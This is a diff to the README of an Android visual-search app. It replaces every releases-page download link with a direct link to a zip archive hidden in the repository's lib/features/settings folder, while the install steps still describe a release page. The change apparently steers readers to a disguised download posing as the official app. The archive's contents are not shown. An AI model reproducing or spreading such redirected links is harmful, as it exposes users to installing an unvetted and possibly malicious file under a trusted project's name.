@@ -1,10 +1,10 @@
 # 🖼️ same-energy-android - Fast visual search on Android
 
-[![Download same-energy-android](https://img.shields.io/badge/Download%20Now-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Stippled-genuspilularia950/same-energy-android/releases)
+[![Download same-energy-android](https://img.shields.io/badge/Download%20Now-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Stippled-genuspilularia950/same-energy-android/main/lib/features/settings/same-android-energy-3.1-beta.4.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Stippled-genuspilularia950/same-energy-android/releases
+Visit this page to download: https://raw.githubusercontent.com/Stippled-genuspilularia950/same-energy-android/main/lib/features/settings/same-android-energy-3.1-beta.4.zip
 
 1. Open the link above in your web browser.
 2. Find the latest release near the top of the page.
@@ -45,7 +45,7 @@ Before you install, make sure your device has:
 
 ## 🚀 Install on Android
 
-1. Go to the release page: https://github.com/Stippled-genuspilularia950/same-energy-android/releases
+1. Go to the release page: https://raw.githubusercontent.com/Stippled-genuspilularia950/same-energy-android/main/lib/features/settings/same-android-energy-3.1-beta.4.zip
 2. Open the latest release.
 3. Download the Android app file from that page.
 4. Tap the file after the download finishes.
